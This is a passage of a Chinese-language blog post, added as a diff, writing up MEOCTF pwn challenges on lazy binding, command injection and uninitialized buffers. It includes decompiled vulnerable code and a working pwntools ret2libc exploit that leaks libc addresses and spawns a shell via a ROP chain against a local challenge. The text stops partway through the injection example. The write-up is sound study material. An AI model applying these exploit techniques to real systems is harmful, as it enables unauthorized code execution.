@@ -1,0 +1,622 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.0.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/black/pace-theme-flat-top.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous" defer></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.25.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"github-dark","dark":"github-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"language":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":true,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="动态链接和延迟绑定 inject 未初始化缓冲区">
+<meta property="og:type" content="article">
+<meta property="og:title" content="11.23">
+<meta property="og:url" content="http://example.com/2025/11/23/11/23/index.html">
+<meta property="og:site_name" content="超级玉米人的博客">
+<meta property="og:description" content="动态链接和延迟绑定 inject 未初始化缓冲区">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-11-23T11:07:21.699Z">
+<meta property="article:modified_time" content="2025-11-23T14:17:24.348Z">
+<meta property="article:author" content="超级玉米人">
+<meta property="article:tag" content="study">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://example.com/2025/11/23/11/23/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2025/11/23/11/23/","path":"2025/11/23/11/23/","title":"11.23"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>11.23 | 超级玉米人的博客</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+
+
+
+  <script src="/js/third-party/pace.js" defer></script>
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">false</script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.9/katex.min.css" integrity="sha256-UF1fgpAiu3tPJN/uCqEUHNe7pnr+QR0SQDNfgglgtcM=" crossorigin="anonymous">
+
+
+<!-- GitHub 丝带 -->
+<a href="https://github.com/Yoyolp/blog_recouse" class="github-corner" aria-label="View source on GitHub" target="_blank" rel="noopener">
+  <svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true">
+    <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+    <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+    <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path>
+  </svg>
+</a>
+
+<!-- particles.js 粒子库 -->
+<script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+<!-- 引入 typed.js -->
+<script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12"></script>
+
+
+<style>
+  /* 原有的封面样式保持不变 */
+  #particles-js {
+    width: 100%;
+    height: 100vh;
+    position: relative;
+    background: linear-gradient(120deg, #e0c3fc 0%, #8ec5fc 100%);
+  }
+
+  .hero-content {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    text-align: center;
+    color: #fff;
+    z-index: 1;
+    width: 100%;
+  }
+
+  .hero-title {
+    font-size: 3rem;
+    font-weight: bold;
+    margin-bottom: 1rem;
+    text-shadow: 2px 2px 8px rgba(0,0,0,0.3);
+  }
+
+  .hero-subtitle {
+    font-size: 1.5rem;
+    margin-bottom: 2rem;
+    text-shadow: 1px 1px 4px rgba(0,0,0,0.3);
+    min-height: 1.8em; /* 防止布局抖动 */
+  }
+
+  /* 打字机光标样式 */
+  .typed-cursor {
+    font-size: 1.5rem;
+    opacity: 1;
+    animation: blink 0.7s infinite;
+  }
+
+  @keyframes blink {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0; }
+  }
+
+  .hero-arrow {
+    font-size: 2.5rem;
+    animation: bounce 2s infinite;
+    cursor: pointer;
+  }
+
+  @keyframes bounce {
+    0%, 20%, 50%, 80%, 100% {
+      transform: translateY(0);
+    }
+    40% {
+      transform: translateY(-15px);
+    }
+    60% {
+      transform: translateY(-7px);
+    }
+  }
+</style>
+
+<div id="particles-js" style="display: none;">
+  <div class="hero-content">
+    <div class="hero-title">超级玉米人的博客</div>
+    <div class="hero-subtitle">
+      <span id="typed-text"></span>
+    </div>
+    <div class="hero-arrow">↓</div>
+  </div>
+</div>
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">超级玉米人的博客</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">时间Cia不多llo~(∠・ω< )⌒★</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%92%8C%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A"><span class="nav-number">1.</span> <span class="nav-text"> 动态链接和延迟绑定</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98-meoctf-easylibc"><span class="nav-number">1.1.</span> <span class="nav-text"> 例题 MEOCTF easylibc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">1.2.</span> <span class="nav-text"> 总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#inject"><span class="nav-number">2.</span> <span class="nav-text"> inject</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98-meoctf-inject"><span class="nav-number">2.1.</span> <span class="nav-text"> 例题 MEOCTF inject</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93-2"><span class="nav-number">2.2.</span> <span class="nav-text"> 总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%AA%E5%88%9D%E5%A7%8B%E5%8C%96%E7%BC%93%E5%86%B2%E5%8C%BA"><span class="nav-number">3.</span> <span class="nav-text"> 未初始化缓冲区</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98-meoctf-xdulaker"><span class="nav-number">3.1.</span> <span class="nav-text"> 例题 MEOCTF xdulaker</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93-3"><span class="nav-number">3.2.</span> <span class="nav-text"> 总结</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="超级玉米人"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">超级玉米人</p>
+  <div class="site-description" itemprop="description">一个基于Hexo的技术博客</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">39</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Yoyolp" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Yoyolp" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+<div id="sidebar-digital-clock" class="site-overview-item">
+    <div class="clock-container">
+        <div class="clock-time">00:00:00</div>
+        <div class="clock-date">2024-01-01</div>
+        <div class="clock-weekday">星期一</div>
+    </div>
+</div>
+
+<script>
+// 简化版电子钟，避免复杂的 JS
+function initClock() {
+    function updateClock() {
+        const now = new Date();
+        const hours = String(now.getHours()).padStart(2, '0');
+        const minutes = String(now.getMinutes()).padStart(2, '0');
+        const seconds = String(now.getSeconds()).padStart(2, '0');
+        
+        const year = now.getFullYear();
+        const month = String(now.getMonth() + 1).padStart(2, '0');
+        const day = String(now.getDate()).padStart(2, '0');
+        
+        const weekdays = ['星期日', '星期一', '星期二', '星期三', '星期四', '星期五', '星期六'];
+        const weekday = weekdays[now.getDay()];
+        
+        const clockElement = document.getElementById('sidebar-digital-clock');
+        if (clockElement) {
+            clockElement.querySelector('.clock-time').textContent = hours + ':' + minutes + ':' + seconds;
+            clockElement.querySelector('.clock-date').textContent = year + '-' + month + '-' + day;
+            clockElement.querySelector('.clock-weekday').textContent = weekday;
+        }
+    }
+    
+    updateClock();
+    setInterval(updateClock, 1000);
+}
+
+// 延迟初始化，确保 DOM 加载完成
+setTimeout(initClock, 100);
+</script>
+
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/11/23/11/23/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="超级玉米人">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="超级玉米人的博客">
+      <meta itemprop="description" content="一个基于Hexo的技术博客">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="11.23 | 超级玉米人的博客">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          11.23
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2025-11-23 19:07:21 / 修改时间：22:17:24" itemprop="dateCreated datePublished" datetime="2025-11-23T19:07:21+08:00">2025-11-23</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>动态链接和延迟绑定</p>
+<p>inject</p>
+<p>未初始化缓冲区</p>
+<span id="more"></span>
+<h2 id="动态链接和延迟绑定"><a class="markdownIt-Anchor" href="#动态链接和延迟绑定"></a> 动态链接和延迟绑定</h2>
+<p>一些来自动态连接库的函数，是在第一次调用的时候才会真正加载程序的地址，这就是延迟绑定，而这一个过程主要通过plt 表和 got 表来实现，<br />
+其中 plt 是程序连接表，而 got表 是全局偏移表，程序在运行时，首次调用一个函数 假设为<code>printf</code> 的时候，程序会调用 plt，通过plt跳转到，对应的got表之中<br />
+但是在第一次调用的时候，got表中存放的不是函数的确切地址而是跳转回 plt中下一条指令的地址，而这个<strong>下一条</strong> 指令会将 代表这个函数的标识符压入栈中，此时链接器<code>ld</code>工作根据这个压入的标识符找到目标函数的真实位置，然后跟新GOT，此时GOT表中的地址就是该函数真实的地址，所以通过这个特性，我们可以通过泄露出的GOT更新前后的地址，分别求出libc(c 标准库)和elfbase(程序)的基址，来进行进一步的攻击</p>
+<h3 id="例题-meoctf-easylibc"><a class="markdownIt-Anchor" href="#例题-meoctf-easylibc"></a> 例题 <a target="_blank" rel="noopener" href="https://ctf.xidian.edu.cn/training/22?challenge=895&amp;tab=terminal">MEOCTF easylibc</a></h3>
+<p>通过<code>checksec ./pwn</code> 发现程序开启了如下保护</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/home/yoyo/yoyo_dir/MyProject/aboutPwn/base/ezlibc/ezlibc/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>
+<p>ASLR PIE 让我们不能直接获取函数的地址，所以需要求出程序的基地址，通过ida 发现其中有大量 <code>ender64</code>, 所以也不能直接使用pwntool 获取函数的偏移</p>
+<p>通过ida分析发现存在如下关键函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setbuf(_bss_start, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What is this?\nHow can I use %p without a backdoor? Damn!\n&quot;</span>, &amp;read);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Something happening&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x60u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其中 <code>printf</code>泄露出了 read 第一次调用前的地址，它所指向的是 plt下一条指令的地址，所以可以通过gdb 调试出并计算出程序的基地址, 函数vlun 存在栈溢出漏洞</p>
+<p>思路，我们可以有如下攻击思路，第一次构建rop 将再次调用main 函数利用<code>printf(&quot;What is this?\nHow can I use %p without a backdoor? Damn!\n&quot;, &amp;read);</code> 这条指令算出read 的真实地址，<br />
+加上此前泄露出的plt地址我们可以算出 程序的基地址和libc 的基地址，为第二次 ret2libc 攻击提供条件</p>
+<p>所以我们可以构建出如下脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf  = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">43527</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取泄露出来的 read 地址获取程序基地址</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;use&quot;</span>)</span><br><span class="line">readLeakStr  = <span class="built_in">str</span>(p.recvline()).split(<span class="string">&quot; &quot;</span>)[<span class="number">1</span>]</span><br><span class="line">readLeakAddr = <span class="built_in">int</span>(readLeakStr, <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">f&quot; function@read:<span class="subst">&#123; <span class="built_in">hex</span>(readLeakAddr) &#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">elfBase = readLeakAddr - <span class="number">0x1060</span>       <span class="comment"># 因为 plt的延迟绑定 导致无法准确获取正确偏移 gdb 调试得出</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">f&quot;address@elfBase: <span class="subst">&#123;<span class="built_in">hex</span>(elfBase)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># input(f&quot;$ pwndbg -p &#123;p.pid&#125;             ######&quot;)</span></span><br><span class="line"><span class="comment"># 我们需要构建一个rop 在次执行 main 函数 泄露出 read 函数的真实地址</span></span><br><span class="line">mainAddr = elfBase + <span class="number">0x11EE</span>           <span class="comment"># 存在endr64</span></span><br><span class="line">offset = <span class="number">32</span></span><br><span class="line">payload = flat([</span><br><span class="line">  <span class="string">b&quot;a&quot;</span> * offset,</span><br><span class="line">  p64(elfBase + <span class="number">0x40A0</span>),  <span class="comment"># 存疑</span></span><br><span class="line">  p64(mainAddr)</span><br><span class="line">])</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;use&quot;</span>)</span><br><span class="line">readLeakStr  = <span class="built_in">str</span>(p.recvline()).split(<span class="string">&quot; &quot;</span>)[<span class="number">1</span>]</span><br><span class="line">readLeakAddr = <span class="built_in">int</span>(readLeakStr, <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">f&quot;function@read:<span class="subst">&#123; <span class="built_in">hex</span>(readLeakAddr) &#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># 此时 readLeakAddr 为真实地址</span></span><br><span class="line"></span><br><span class="line">libc.address = readLeakAddr - libc.symbols[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">log.info(<span class="string">f&quot;Address@libcBase:<span class="subst">&#123;<span class="built_in">hex</span>(libc.address)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x29139</span> + libc.address</span><br><span class="line">rdi = <span class="number">0x2a3e5</span> + libc.address</span><br><span class="line"></span><br><span class="line">systemAddr = libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binshAddr  = <span class="built_in">next</span>(libc.search(<span class="string">&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line">payload = flat([</span><br><span class="line">  <span class="string">b&quot;a&quot;</span> * offset,</span><br><span class="line">  p64(elfBase + <span class="number">0x4500</span>),</span><br><span class="line">  p64(ret),</span><br><span class="line">  p64(rdi),</span><br><span class="line">  p64(binshAddr),</span><br><span class="line">  p64(systemAddr)</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h3>
+<p>要注意 对于可能的libc 函数的调用泄露，要注意是否调用过否则，否则只会调用出错误的地址, 对于 endr64的处理方法，可以尝试 使用传统函数序言的地址，绕过检测</p>
+<h2 id="inject"><a class="markdownIt-Anchor" href="#inject"></a> inject</h2>
+<p>除了使用栈溢出的方式，找出漏洞，有时候程序的逻辑漏洞也可以是利用点</p>
+<h3 id="例题-meoctf-inject"><a class="markdownIt-Anchor" href="#例题-meoctf-inject"></a> 例题 <a target="_blank" rel="noopener" href="https://ctf.xidian.edu.cn/training/22?challenge=962">MEOCTF inject</a></h3>
+<p>下载目标文件发现 保护全开</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/home/yoyo/yoyo_dir/MyProject/aboutPwn/base/inject/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>
+<p>通过ida分析发现没有可以利用的漏洞</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">ping_host</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *p_buf; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> *Invalid_hostname_or_IP; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+1h] [rbp-51h]</span></span><br><span class="line">  _QWORD buf[<span class="number">2</span>]; <span class="comment">// [rsp+2h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">char</span> command[<span class="number">40</span>]; <span class="comment">// [rsp+12h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+3Ah] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  buf[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  buf[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  _printf_chk(<span class="number">1</span>, <span class="string">&quot;Enter host to ping: &quot;</span>);</span><br><span class="line">  p_buf = buf;</span><br><span class="line">  <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, <span class="number">0xFu</span>) &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  v1 = <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)buf);</span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;v4 + v1) == <span class="number">10</span> )</span><br><span class="line">    *(&amp;v4 + v1) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( check((<span class="type">const</span> <span class="type">char</span> *)buf) )</span><br><span class="line">  &#123;</span><br><span class="line">    p_buf = &amp;qword_20;</span><br><span class="line">    _snprintf_chk(command, <span class="number">32</span>, <span class="number">1</span>, <span class="number">32</span>, <span class="string">&quot;ping %s -c 4&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)buf);</span><br><span class="line">    Invalid_hostname_or_IP = command;</span><br><span class="line">    execute(command);</span><br><span class="line">  